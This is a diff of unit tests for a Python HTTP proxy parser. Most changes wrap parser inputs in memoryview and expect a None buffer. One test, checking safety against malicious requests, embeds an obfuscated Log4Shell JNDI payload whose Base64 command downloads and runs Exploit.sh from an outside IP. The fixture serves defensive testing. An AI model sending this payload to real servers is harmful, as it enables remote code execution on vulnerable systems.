@@ -28,21 +28,21 @@ class TestHttpParser(unittest.TestCase):
 
     def test_issue_127(self) -> None:
         with self.assertRaises(HttpProtocolException):
-            self.parser.parse(CRLF)
+            self.parser.parse(memoryview(CRLF))
 
         with self.assertRaises(HttpProtocolException):
             raw = b'qwqrqw!@!#@!#ad adfad\r\n'
             while True:
-                self.parser.parse(raw)
+                self.parser.parse(memoryview(raw))
 
     def test_issue_398(self) -> None:
         p = HttpParser(httpParserTypes.RESPONSE_PARSER)
-        p.parse(HTTP_1_0 + b' 200 OK' + CRLF)
+        p.parse(memoryview(HTTP_1_0 + b' 200 OK' + CRLF))
         self.assertEqual(p.version, HTTP_1_0)
         self.assertEqual(p.code, b'200')
         self.assertEqual(p.reason, b'OK')
         self.assertEqual(p.state, httpParserStates.LINE_RCVD)
-        p.parse(
+        p.parse(memoryview(
             b'CP=CAO PSA OUR' + CRLF +
             b'Cache-Control:private,max-age=0;' + CRLF +
             b'X-Frame-Options:SAMEORIGIN' + CRLF +
@@ -53,12 +53,12 @@ class TestHttpParser(unittest.TestCase):
             b'Set-Cookie: lang=eng; path=/;HttpOnly;' + CRLF +
             b'Content-type:text/html;charset=UTF-8;' + CRLF + CRLF +
             b'<!-- HTML RESPONSE HERE -->',
-        )
+        ))
         self.assertEqual(p.body, b'<!-- HTML RESPONSE HERE -->')
         self.assertEqual(p.state, httpParserStates.RCVING_BODY)
 
     def test_urlparse(self) -> None:
-        self.parser.parse(b'CONNECT httpbin.org:443 HTTP/1.1\r\n')
+        self.parser.parse(memoryview(b'CONNECT httpbin.org:443 HTTP/1.1\r\n'))
         self.assertTrue(self.parser.is_https_tunnel)
         self.assertFalse(self.parser.is_connection_upgrade)
         self.assertTrue(self.parser.is_http_1_1_keep_alive)
@@ -69,41 +69,43 @@ class TestHttpParser(unittest.TestCase):
         self.assertNotEqual(self.parser.state, httpParserStates.COMPLETE)
 
     def test_urlparse_on_invalid_connect_request(self) -> None:
-        self.parser.parse(b'CONNECT / HTTP/1.0\r\n\r\n')
+        self.parser.parse(memoryview(b'CONNECT / HTTP/1.0\r\n\r\n'))
         self.assertTrue(self.parser.is_https_tunnel)
         self.assertEqual(self.parser.host, None)
         self.assertEqual(self.parser.port, 443)
         self.assertEqual(self.parser.state, httpParserStates.COMPLETE)
 
     def test_unicode_character_domain_connect(self) -> None:
-        self.parser.parse(bytes_('CONNECT ççç.org:443 HTTP/1.1\r\n'))
+        self.parser.parse(memoryview(
+            bytes_('CONNECT ççç.org:443 HTTP/1.1\r\n')))
         self.assertTrue(self.parser.is_https_tunnel)
         self.assertEqual(self.parser.host, bytes_('ççç.org'))
         self.assertEqual(self.parser.port, 443)
 
     def test_invalid_ipv6_in_request_line(self) -> None:
         self.parser.parse(
-            bytes_('CONNECT 2001:db8:3333:4444:CCCC:DDDD:EEEE:FFFF:443 HTTP/1.1\r\n'),
+            memoryview(
+                bytes_('CONNECT 2001:db8:3333:4444:CCCC:DDDD:EEEE:FFFF:443 HTTP/1.1\r\n')),
         )
         self.assertTrue(self.parser.is_https_tunnel)
         self.assertEqual(
-            self.parser.host, bytes_(
+            self.parser.host, memoryview(bytes_(
                 '[2001:db8:3333:4444:CCCC:DDDD:EEEE:FFFF]',
-            ),
+            )),
         )
         self.assertEqual(self.parser.port, 443)
 
     def test_valid_ipv6_in_request_line(self) -> None:
         self.parser.parse(
-            bytes_(
+            memoryview(bytes_(
                 'CONNECT [2001:db8:3333:4444:CCCC:DDDD:EEEE:FFFF]:443 HTTP/1.1\r\n',
-            ),
+            )),
         )
         self.assertTrue(self.parser.is_https_tunnel)
         self.assertEqual(
-            self.parser.host, bytes_(
+            self.parser.host, memoryview(bytes_(
                 '[2001:db8:3333:4444:CCCC:DDDD:EEEE:FFFF]',
-            ),
+            )),
         )
         self.assertEqual(self.parser.port, 443)
 
@@ -223,9 +225,9 @@ class TestHttpParser(unittest.TestCase):
     def test_connect_request_with_crlf_as_separate_chunk(self) -> None:
         """See https://github.com/abhinavsingh/py/issues/70 for background."""
         raw = b'CONNECT pypi.org:443 HTTP/1.0\r\n'
-        self.parser.parse(raw)
+        self.parser.parse(memoryview(raw))
         self.assertEqual(self.parser.state, httpParserStates.LINE_RCVD)
-        self.parser.parse(CRLF)
+        self.parser.parse(memoryview(CRLF))
         self.assertEqual(self.parser.state, httpParserStates.COMPLETE)
 
     def test_get_full_parse(self) -> None:
@@ -238,7 +240,7 @@ class TestHttpParser(unittest.TestCase):
             b'https://example.com/path/dir/?a=b&c=d#p=q',
             b'example.com',
         )
-        self.parser.parse(pkt)
+        self.parser.parse(memoryview(pkt))
         self.assertEqual(self.parser.total_size, len(pkt))
         assert self.parser._url and self.parser._url.remainder
         self.assertEqual(self.parser._url.remainder, b'/path/dir/?a=b&c=d#p=q')
@@ -264,7 +266,7 @@ class TestHttpParser(unittest.TestCase):
 
     def test_line_rcvd_to_rcving_headers_state_change(self) -> None:
         pkt = b'GET http://localhost HTTP/1.1'
-        self.parser.parse(pkt)
+        self.parser.parse(memoryview(pkt))
         self.assertEqual(self.parser.total_size, len(pkt))
         self.assert_state_change_with_crlf(
             httpParserStates.INITIALIZED,
@@ -276,7 +278,7 @@ class TestHttpParser(unittest.TestCase):
         pkt = CRLF.join([
             b'GET http://localhost:8080 HTTP/1.1',
         ])
-        self.parser.parse(pkt)
+        self.parser.parse(memoryview(pkt))
         self.assertEqual(self.parser.total_size, len(pkt))
         self.assertEqual(self.parser.method, None)
         self.assertEqual(self.parser._url, None)
@@ -286,7 +288,7 @@ class TestHttpParser(unittest.TestCase):
             httpParserStates.INITIALIZED,
         )
 
-        self.parser.parse(CRLF)
+        self.parser.parse(memoryview(CRLF))
         self.assertEqual(self.parser.total_size, len(pkt) + len(CRLF))
         self.assertEqual(self.parser.method, b'GET')
         assert self.parser._url
@@ -296,7 +298,7 @@ class TestHttpParser(unittest.TestCase):
         self.assertEqual(self.parser.state, httpParserStates.LINE_RCVD)
 
         host_hdr = b'Host: localhost:8080'
-        self.parser.parse(host_hdr)
+        self.parser.parse(memoryview(host_hdr))
         self.assertEqual(
             self.parser.total_size,
             len(pkt) + len(CRLF) + len(host_hdr),
@@ -305,7 +307,7 @@ class TestHttpParser(unittest.TestCase):
         self.assertEqual(self.parser.buffer, b'Host: localhost:8080')
         self.assertEqual(self.parser.state, httpParserStates.LINE_RCVD)
 
-        self.parser.parse(CRLF * 2)
+        self.parser.parse(memoryview(CRLF * 2))
         self.assertEqual(
             self.parser.total_size, len(pkt) +
             (3 * len(CRLF)) + len(host_hdr),
@@ -321,12 +323,12 @@ class TestHttpParser(unittest.TestCase):
         self.assertEqual(self.parser.state, httpParserStates.COMPLETE)
 
     def test_get_partial_parse2(self) -> None:
-        self.parser.parse(
+        self.parser.parse(memoryview(
             CRLF.join([
                 b'GET http://localhost:8080 HTTP/1.1',
                 b'Host: ',
             ]),
-        )
+        ))
         self.assertEqual(self.parser.method, b'GET')
         assert self.parser._url
         self.assertEqual(self.parser._url.hostname, b'localhost')
@@ -335,7 +337,7 @@ class TestHttpParser(unittest.TestCase):
         self.assertEqual(self.parser.buffer, b'Host: ')
         self.assertEqual(self.parser.state, httpParserStates.LINE_RCVD)
 
-        self.parser.parse(b'localhost:8080' + CRLF)
+        self.parser.parse(memoryview(b'localhost:8080' + CRLF))
         assert self.parser.headers
         self.assertEqual(
             self.parser.headers[b'host'],
@@ -344,14 +346,14 @@ class TestHttpParser(unittest.TestCase):
                 b'localhost:8080',
             ),
         )
-        self.assertEqual(self.parser.buffer, b'')
+        self.assertEqual(self.parser.buffer, None)
         self.assertEqual(
             self.parser.state,
             httpParserStates.RCVING_HEADERS,
         )
 
-        self.parser.parse(b'Content-Type: text/plain' + CRLF)
-        self.assertEqual(self.parser.buffer, b'')
+        self.parser.parse(memoryview(b'Content-Type: text/plain' + CRLF))
+        self.assertEqual(self.parser.buffer, None)
         assert self.parser.headers
         self.assertEqual(
             self.parser.headers[b'content-type'], (
@@ -364,7 +366,7 @@ class TestHttpParser(unittest.TestCase):
             httpParserStates.RCVING_HEADERS,
         )
 
-        self.parser.parse(CRLF)
+        self.parser.parse(memoryview(CRLF))
         self.assertEqual(self.parser.state, httpParserStates.COMPLETE)
 
     def test_post_full_parse(self) -> None:
@@ -375,7 +377,7 @@ class TestHttpParser(unittest.TestCase):
             b'Content-Type: application/x-www-form-urlencoded' + CRLF,
             b'a=b&c=d',
         ])
-        self.parser.parse(raw % b'http://localhost')
+        self.parser.parse(memoryview(raw % b'http://localhost'))
         self.assertEqual(self.parser.method, b'POST')
         assert self.parser._url
         self.assertEqual(self.parser._url.hostname, b'localhost')
@@ -391,7 +393,7 @@ class TestHttpParser(unittest.TestCase):
             (b'Content-Length', b'7'),
         )
         self.assertEqual(self.parser.body, b'a=b&c=d')
-        self.assertEqual(self.parser.buffer, b'')
+        self.assertEqual(self.parser.buffer, None)
         self.assertEqual(self.parser.state, httpParserStates.COMPLETE)
         self.assertEqual(len(self.parser.build()), len(raw % b'/'))
 
@@ -402,20 +404,20 @@ class TestHttpParser(unittest.TestCase):
         final_state: int,
     ) -> None:
         self.assertEqual(self.parser.state, initial_state)
-        self.parser.parse(CRLF)
+        self.parser.parse(memoryview(CRLF))
         self.assertEqual(self.parser.state, next_state)
-        self.parser.parse(CRLF)
+        self.parser.parse(memoryview(CRLF))
         self.assertEqual(self.parser.state, final_state)
 
     def test_post_partial_parse(self) -> None:
-        self.parser.parse(
+        self.parser.parse(memoryview(
             CRLF.join([
                 b'POST http://localhost HTTP/1.1',
                 b'Host: localhost',
                 b'Content-Length: 7',
                 b'Content-Type: application/x-www-form-urlencoded',
             ]),
-        )
+        ))
         self.assertEqual(self.parser.method, b'POST')
         assert self.parser._url
         self.assertEqual(self.parser._url.hostname, b'localhost')
@@ -427,18 +429,18 @@ class TestHttpParser(unittest.TestCase):
             httpParserStates.HEADERS_COMPLETE,
         )
 
-        self.parser.parse(b'a=b')
+        self.parser.parse(memoryview(b'a=b'))
         self.assertEqual(
             self.parser.state,
             httpParserStates.RCVING_BODY,
         )
         self.assertEqual(self.parser.body, b'a=b')
-        self.assertEqual(self.parser.buffer, b'')
+        self.assertEqual(self.parser.buffer, None)
 
-        self.parser.parse(b'&c=d')
+        self.parser.parse(memoryview(b'&c=d'))
         self.assertEqual(self.parser.state, httpParserStates.COMPLETE)
         self.assertEqual(self.parser.body, b'a=b&c=d')
-        self.assertEqual(self.parser.buffer, b'')
+        self.assertEqual(self.parser.buffer, None)
 
     def test_connect_request_without_host_header_request_parse(self) -> None:
         """Case where clients can send CONNECT request without a Host header field.
@@ -451,7 +453,7 @@ class TestHttpParser(unittest.TestCase):
 
         See https://github.com/abhinavsingh/py/issues/5 for details.
         """
-        self.parser.parse(b'CONNECT pypi.org:443 HTTP/1.0\r\n\r\n')
+        self.parser.parse(memoryview(b'CONNECT pypi.org:443 HTTP/1.0\r\n\r\n'))
         self.assertEqual(self.parser.method, httpMethods.CONNECT)
         self.assertEqual(self.parser.version, b'HTTP/1.0')
         self.assertEqual(self.parser.state, httpParserStates.COMPLETE)
@@ -465,14 +467,14 @@ class TestHttpParser(unittest.TestCase):
 
         See https://github.com/abhinavsingh/py/issues/20 for details.
         """
-        self.parser.parse(
+        self.parser.parse(memoryview(
             CRLF.join([
                 b'POST http://localhost HTTP/1.1',
                 b'Host: localhost',
                 b'Content-Type: application/x-www-form-urlencoded',
                 CRLF,
             ]),
-        )
+        ))
         self.assertEqual(self.parser.method, b'POST')
         self.assertEqual(self.parser.state, httpParserStates.COMPLETE)
 
@@ -492,17 +494,17 @@ class TestHttpParser(unittest.TestCase):
         pipelined responses not trigger stream close but may receive multiple responses.
         """
         self.parser.type = httpParserTypes.RESPONSE_PARSER
-        self.parser.parse(b'HTTP/1.0 200 OK' + CRLF)
+        self.parser.parse(memoryview(b'HTTP/1.0 200 OK' + CRLF))
         self.assertEqual(self.parser.code, b'200')
         self.assertEqual(self.parser.version, b'HTTP/1.0')
         self.assertEqual(self.parser.state, httpParserStates.LINE_RCVD)
-        self.parser.parse(
+        self.parser.parse(memoryview(
             CRLF.join([
                 b'Server: BaseHTTP/0.3 Python/2.7.10',
                 b'Date: Thu, 13 Dec 2018 16:24:09 GMT',
                 CRLF,
             ]),
-        )
+        ))
         self.assertEqual(
             self.parser.state,
             httpParserStates.COMPLETE,
@@ -510,7 +512,7 @@ class TestHttpParser(unittest.TestCase):
 
     def test_response_parse(self) -> None:
         self.parser.type = httpParserTypes.RESPONSE_PARSER
-        self.parser.parse(
+        self.parser.parse(memoryview(
             b''.join([
                 b'HTTP/1.1 301 Moved Permanently\r\n',
                 b'Location: http://www.google.com/\r\n',
@@ -527,7 +529,7 @@ class TestHttpParser(unittest.TestCase):
                 b'<BODY>\n<H1>301 Moved</H1>\nThe document has moved\n' +
                 b'<A HREF="http://www.google.com/">here</A>.\r\n</BODY></HTML>\r\n',
             ]),
-        )
+        ))
         self.assertEqual(self.parser.code, b'301')
         self.assertEqual(self.parser.reason, b'Moved Permanently')
         self.assertEqual(self.parser.version, b'HTTP/1.1')
@@ -546,7 +548,7 @@ class TestHttpParser(unittest.TestCase):
 
     def test_response_partial_parse(self) -> None:
         self.parser.type = httpParserTypes.RESPONSE_PARSER
-        self.parser.parse(
+        self.parser.parse(memoryview(
             b''.join([
                 b'HTTP/1.1 301 Moved Permanently\r\n',
                 b'Location: http://www.google.com/\r\n',
@@ -559,7 +561,7 @@ class TestHttpParser(unittest.TestCase):
                 b'X-XSS-Protection: 1; mode=block\r\n',
                 b'X-Frame-Options: SAMEORIGIN\r\n',
             ]),
-        )
+        ))
         assert self.parser.headers
         self.assertEqual(
             self.parser.headers[b'x-frame-options'],
@@ -569,28 +571,28 @@ class TestHttpParser(unittest.TestCase):
             self.parser.state,
             httpParserStates.RCVING_HEADERS,
         )
-        self.parser.parse(b'\r\n')
+        self.parser.parse(memoryview(CRLF))
         self.assertEqual(
             self.parser.state,
             httpParserStates.HEADERS_COMPLETE,
         )
-        self.parser.parse(
+        self.parser.parse(memoryview(
             b'<HTML><HEAD><meta http-equiv="content-type" content="text/html;charset=utf-8">\n' +
             b'<TITLE>301 Moved</TITLE></HEAD>',
-        )
+        ))
         self.assertEqual(
             self.parser.state,
             httpParserStates.RCVING_BODY,
         )
-        self.parser.parse(
+        self.parser.parse(memoryview(
             b'<BODY>\n<H1>301 Moved</H1>\nThe document has moved\n' +
             b'<A HREF="http://www.google.com/">here</A>.\r\n</BODY></HTML>\r\n',
-        )
+        ))
         self.assertEqual(self.parser.state, httpParserStates.COMPLETE)
 
     def test_chunked_response_parse(self) -> None:
         self.parser.type = httpParserTypes.RESPONSE_PARSER
-        self.parser.parse(
+        self.parser.parse(memoryview(
             b''.join([
                 b'HTTP/1.1 200 OK\r\n',
                 b'Content-Type: application/json\r\n',
@@ -607,7 +609,7 @@ class TestHttpParser(unittest.TestCase):
                 b'0\r\n',
                 b'\r\n',
             ]),
-        )
+        ))
         self.assertEqual(self.parser.body, b'Wikipedia in\r\n\r\nchunks.')
         self.assertEqual(self.parser.state, httpParserStates.COMPLETE)
 
@@ -635,20 +637,21 @@ class TestHttpParser(unittest.TestCase):
 
     def assert_pipeline_response(self, response: memoryview) -> None:
         self.parser = HttpParser(httpParserTypes.RESPONSE_PARSER)
-        self.parser.parse(response.tobytes() + response.tobytes())
+        self.parser.parse(memoryview(response.tobytes() + response.tobytes()))
         self.assertEqual(self.parser.state, httpParserStates.COMPLETE)
         self.assertEqual(self.parser.body, b'{"key":"value"}')
         self.assertEqual(self.parser.buffer, response)
 
         # parse buffer
         parser = HttpParser(httpParserTypes.RESPONSE_PARSER)
+        assert self.parser.buffer
         parser.parse(self.parser.buffer)
         self.assertEqual(parser.state, httpParserStates.COMPLETE)
         self.assertEqual(parser.body, b'{"key":"value"}')
-        self.assertEqual(parser.buffer, b'')
+        self.assertEqual(parser.buffer, None)
 
     def test_chunked_request_parse(self) -> None:
-        self.parser.parse(
+        self.parser.parse(memoryview(
             build_http_request(
                 httpMethods.POST,
                 b'http://example.org/',
@@ -658,7 +661,7 @@ class TestHttpParser(unittest.TestCase):
                 },
                 body=b'f\r\n{"key":"value"}\r\n0\r\n\r\n',
             ),
-        )
+        ))
         self.assertEqual(self.parser.body, b'{"key":"value"}')
         self.assertEqual(self.parser.state, httpParserStates.COMPLETE)
         self.assertEqual(
@@ -674,39 +677,39 @@ class TestHttpParser(unittest.TestCase):
         )
 
     def test_is_http_1_1_keep_alive(self) -> None:
-        self.parser.parse(
+        self.parser.parse(memoryview(
             build_http_request(
                 httpMethods.GET, b'/',
             ),
-        )
+        ))
         self.assertTrue(self.parser.is_http_1_1_keep_alive)
 
     def test_is_http_1_1_keep_alive_with_non_close_connection_header(self) -> None:
-        self.parser.parse(
+        self.parser.parse(memoryview(
             build_http_request(
                 httpMethods.GET, b'/',
                 headers={
                     b'Connection': b'keep-alive',
                 },
             ),
-        )
+        ))
         self.assertTrue(self.parser.is_http_1_1_keep_alive)
 
     def test_is_not_http_1_1_keep_alive_with_close_header(self) -> None:
-        self.parser.parse(
+        self.parser.parse(memoryview(
             build_http_request(
                 httpMethods.GET, b'/',
                 conn_close=True,
             ),
-        )
+        ))
         self.assertFalse(self.parser.is_http_1_1_keep_alive)
 
     def test_is_not_http_1_1_keep_alive_for_http_1_0(self) -> None:
-        self.parser.parse(
+        self.parser.parse(memoryview(
             build_http_request(
                 httpMethods.GET, b'/', protocol_version=b'HTTP/1.0',
             ),
-        )
+        ))
         self.assertFalse(self.parser.is_http_1_1_keep_alive)
 
     def test_paramiko_doc(self) -> None:
@@ -715,7 +718,7 @@ class TestHttpParser(unittest.TestCase):
                    b'\r\nX-Cname-TryFiles: True\r\nX-Served: Nginx\r\nX-Deity: web02\r\nCF-Cache-Status: DYNAMIC' \
                    b'\r\nServer: cloudflare\r\nCF-RAY: 53f2208c6fef6c38-SJC\r\n\r\n'
         self.parser = HttpParser(httpParserTypes.RESPONSE_PARSER)
-        self.parser.parse(response)
+        self.parser.parse(memoryview(response))
         self.assertEqual(self.parser.state, httpParserStates.COMPLETE)
 
     def test_request_factory(self) -> None:
@@ -766,7 +769,7 @@ class TestHttpParser(unittest.TestCase):
             )
 
     def test_is_safe_against_malicious_requests(self) -> None:
-        self.parser.parse(
+        self.parser.parse(memoryview(
             b'GET / HTTP/1.1\r\n' +
             b'Host: 34.131.9.210:443\r\n' +
             b'User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}:' +
@@ -783,7 +786,7 @@ class TestHttpParser(unittest.TestCase):
             b'//198.98.53.25:1389/TomcatBypass/Command/Base64d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pd' +
             b'C5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOw==}' +
             b'\r\n\r\n',
-        )
+        ))
         self.assertEqual(
             self.parser.header(b'user-agent'),
             b'${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}:' +
@@ -816,20 +819,22 @@ class TestHttpParser(unittest.TestCase):
     def test_parses_icap_protocol(self) -> None:
         # Ref https://datatracker.ietf.org/doc/html/rfc3507
         self.parser.parse(
-            b'REQMOD icap://icap-server.net/server?arg=87 ICAP/1.0\r\n' +
-            b'Host: icap-server.net\r\n' +
-            b'Encapsulated: req-hdr=0, req-body=154' +
-            b'\r\n\r\n' +
-            b'POST /origin-resource/form.pl HTTP/1.1\r\n' +
-            b'Host: www.origin-server.com\r\n' +
-            b'Accept: text/html, text/plain\r\n' +
-            b'Accept-Encoding: compress\r\n' +
-            b'Cache-Control: no-cache\r\n' +
-            b'\r\n' +
-            b'1e\r\n' +
-            b'I am posting this information.\r\n' +
-            b'0\r\n' +
-            b'\r\n',
+            memoryview(
+                b'REQMOD icap://icap-server.net/server?arg=87 ICAP/1.0\r\n' +
+                b'Host: icap-server.net\r\n' +
+                b'Encapsulated: req-hdr=0, req-body=154' +
+                b'\r\n\r\n' +
+                b'POST /origin-resource/form.pl HTTP/1.1\r\n' +
+                b'Host: www.origin-server.com\r\n' +
+                b'Accept: text/html, text/plain\r\n' +
+                b'Accept-Encoding: compress\r\n' +
+                b'Cache-Control: no-cache\r\n' +
+                b'\r\n' +
+                b'1e\r\n' +
+                b'I am posting this information.\r\n' +
+                b'0\r\n' +
+                b'\r\n',
+            ),
             allowed_url_schemes=[b'icap'],
         )
         self.assertEqual(self.parser.method, b'REQMOD')
@@ -844,7 +849,7 @@ class TestHttpParser(unittest.TestCase):
         # Will fail to parse because of invalid host and port in the request line
         # Our Url parser expects an integer port.
         with self.assertRaises(ValueError):
-            self.parser.parse(
+            self.parser.parse(memoryview(
                 b'OPTIONS sip:nm SIP/2.0\r\n' +
                 b'Via: SIP/2.0/TCP nm;branch=foo\r\n' +
                 b'From: <sip:nm@nm>;tag=root\r\nTo: <sip:nm2@nm2>\r\n' +
@@ -855,4 +860,4 @@ class TestHttpParser(unittest.TestCase):
                 b'Contact: <sip:nm@nm>\r\n' +
                 b'Accept: application/sdp\r\n' +
                 b'\r\n',
-            )
+            ))
